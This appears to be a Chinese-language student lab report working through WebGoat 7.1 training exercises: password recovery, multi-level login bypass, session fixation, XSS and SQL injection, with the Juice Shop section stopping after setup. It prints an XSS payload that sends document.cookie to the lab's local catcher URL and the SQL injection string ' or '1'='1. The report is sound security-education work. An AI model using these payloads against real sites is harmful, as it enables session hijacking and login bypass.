# Web 应用漏洞攻防

## 实验目的

- 了解常见 Web 漏洞训练平台；
- 了解 常见 Web 漏洞的基本原理；
- 掌握 OWASP Top 10 及常见 Web 高危漏洞的漏洞检测、漏洞利用和漏洞修复方法；

## 实验环境

- WebGoat
- Juice Shop

## 实验要求

- [ ] 每个实验环境完成不少于 **5** 种不同漏洞类型的漏洞利用练习；
- [ ] （可选）使用不同于官方教程中的漏洞利用方法完成目标漏洞利用练习；
- [ ] （可选）**最大化** 漏洞利用效果实验；
- [ ] （可选）编写 **自动化** 漏洞利用脚本完成指定的训练项目；
- [ ] （可选）定位缺陷代码；
- [ ] （可选）尝试从源代码层面修复漏洞；

## 实验过程

### WebGoat 7.1环境下的漏洞利用

* 环境搭建

  * 更新apt并安装docker-compose

    ```
    apt update $$ apt install docker-compose
    ```

  * 查看docker镜像，确认成功安装

    ```
    apt policy docker.io
    ```

  * 将github上的相关仓库克隆到本地

  * 启动docker服务

    ```
    sudo service docker start
    ```

  * 使用以下指令自动安装好WebGoat环境

    ```
    docker-compose up -d
    ```

  * 用 docker ps 查看WebGoat的三个镜像的健康状况：

    ![](images\docker1.png)

    可以看到WebGoat 7.1对应虚拟机的8087端口，WebGoat 8.0对应虚拟机的8088端口，本次实验使用WebGoat 7.1版本。

  * 终端输入 php -S 127.0.0.1:8000 搭建一个内置的web服务器

    ![](images/php-s.png)

  * 在浏览器中输入 127.0.0.1:8087/WebGoat/attack,注册成功后即可开始实验

* 漏洞一：脆弱的访问控制

  * 在左侧菜单中进入 Authentication Flaws->Forgot Password

    ![](images\Password1.png)

    * Web应用通常会有密码找回功能，如设置一些密保问题来验证用户身份，但有些密保问题过于简单容易被穷举出来（如颜色等），是不可靠的。

      ![](images\Password2.png)

    * 不断尝试回答问题获取到用户的详细信息。

      ![](images\Password3.png)

  * 左侧菜单中选择 Multi Level Login1

    * 在用户名密码的基础上又增加了认证码，每个认证码只能用一次。

    * 浏览器右键查看页面源代码，找到隐藏的二级登录序号，将value值改为1，后在输入框中输入一级登录序号，验证成功。

      ![](images\tan1.png)

      ![](images\tan2png.png)

  * 左侧菜单中选择Multi Level Login2

    * 在第二层认证的时候并没有验证用户名与认证码的关系，故我们用Joe的身份进行登录，密码为banana,在第二层认证的时候修改源代码中Joe为Jane,输入认证码并提交。

      ![](images\tan2-1.png)

    * 可以看到成功登录了Jane的账号

      ![](images\tan2-2.png)

* 漏洞二：脆弱认证和会话管理

  * 在左侧菜单中进入 Session Mangagement Flaws->Session Fixation

    * 服务器是通过每个用户的Session ID来认证其身份，如果用户已登录则不必再重新验证。伪造一个带有Session的链接通过邮件的形式发送给别人：

      ![](images\SessionID1.png)

    * 对方收到邮件后点开了链接并进行了登录，用户名为Jane,密码为tarzan

      ![](images\SessionID2.png)

    * 此时在网页地址后面将SessionID更改为附在邮件里的Session的值，即可直接进入对方的账户

      ![](images\SessionID4.png)

* 漏洞三：跨站点脚本（XSS）

  * 在左侧菜单中进入 Cross-Site Scripting(XSS)->Phishing with XSS

    * 输入以下命令：获得页面的Cookie值

      ```html
      <script>alert(document.cookie)</script>
      ```

      ![](images\XSS-cookie.png)

    * 在输入框中输入以下代码：

      ```html
      <script>window.open('http://127.0.0.1:8087/WebGoat/ catcher?PROPERTY=yes&msg='+document.cookie)</script>
      ```

    * 此时弹出了一个新的网页，查看其URL

      ![](images\XSS-succeed.png)

      可以看到其中的msg参数和之前页面的Cookie值相同，实验成功

* 漏洞四：SQL注入缺陷

  * 配置好浏览器的代理

    ![](images\Http1.png)

    删除框里的内容

    ![](images\Http2.png)

  * 打开Burpsuite开始拦截，Intercept is on 为开启拦截，off为关闭拦截

    ![](images\BSon.png)

  * 在左侧菜单中进入Injection Flaws->SQL Injection，页面如下图，此时我们并不知道密码

    ![](images\SQL0.png)

  * 在Burpsuite拦截到的内容中将password的内容更改为 ' or '1'='1

    ![](images\SQL1.png)

  * 将修改后的内容forward，可以看到我们成功绕过认证登录

    ![](images\SQL2.png)

* 漏洞五：未验证用户输入

  * 如果直接用BurpSuite拦截提交请求后，发现Disabled input field没有被抓取到，所以就利用开发者工具将Disabled input field的“disabled”属性删掉

    ![](images\Bypass1.png)

  * 利用burp拦截提交请求，并将6个输入区域(包含radio button，checkbox，输入框，submit按钮)；此时发现Disabled input field输入值也被抓取到了。

    ![](images\Bypass1-2.png)

    ![](images\Bypass2.png)

### Juice Shop环境下的漏洞利用

* 实验环境搭建

  * 进入juice-shop文件夹下，使用以下指令安装Juice Shop环境

    ```
    docker-compose up -d
    ```

    


## 遇到的问题

* 在clone仓库后直接进行 docker-compose up -d 会报错，应先用 sudo service docker start 开启docker服务。

* 安装Juice Shop 环境时总是卡在最后一步。

  ![](images\waiting.png)

##  参考资料

* 在线课本
* [Burp Suite 实战指南](https://www.gitbook.com/book/t0data/burpsuite/details)

* https://blog.csdn.net/yrx0619/article/details/80178018 解决ERROR: Couldn't connect to Docker daemon at http://127.0.0.1:4243 - is it running